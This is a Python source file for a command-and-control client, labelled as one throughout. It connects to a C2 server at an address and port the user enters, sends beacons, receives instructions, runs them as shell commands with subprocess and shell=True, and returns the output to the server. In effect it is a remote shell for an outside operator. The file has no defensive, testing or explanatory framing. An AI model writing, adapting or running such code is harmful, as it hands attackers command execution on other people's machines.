import socket
import subprocess
import logging

logging.basicConfig(level=logging.INFO)

class C2Client:
    def __init__(self, c2_server, c2_port):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.socket = None

    def connect_to_c2_server(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.c2_server, self.c2_port))
            logging.info("Connected to C2 server.")
        except ConnectionRefusedError:
            logging.error("Connection to C2 server refused. Please check the server address and port.")
        except socket.error as e:
            logging.error(f"Socket connection error: {e}")

    def send_beacon(self, message):
        try:
            self.socket.sendall(message.encode())
            logging.info("Beacon message sent to C2 server.")
        except socket.error as e:
            logging.error(f"Failed to send beacon message: {e}")

    def receive_instructions(self):
        try:
            instructions = self.socket.recv(1024).decode()
            logging.info("Received instructions from C2 server: %s", instructions)
            return instructions
        except socket.error as e:
            logging.error(f"Failed to receive instructions: {e}")

    def close(self):
        if self.socket:
            self.socket.close()
            logging.info("Socket connection closed.")

    def execute_command(self, command):
        if command == "exit":
            # Handle the exit command
            return "Exiting shell..."
        else:
            # Execute the command on the remote machine
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return output.decode()
            except subprocess.CalledProcessError as e:
                return f"Error executing command: {e.output.decode()}"

    def run(self):
        self.connect_to_c2_server()

        while True:
            beacon_message = input("Enter the beacon message (or 'exit' to disconnect): ")
            self.send_beacon(beacon_message)

            if beacon_message == "exit":
                self.close()
                break

            instructions = self.receive_instructions()
            output = self.execute_command(instructions)
            self.send_beacon(output)

        self.close()


def main():
    c2_server = input("Enter the C2 server address: ")
    c2_port = int(input("Enter the C2 server port: "))

    client = C2Client(c2_server, c2_port)
    client.run()

if __name__ == "__main__":
    main()
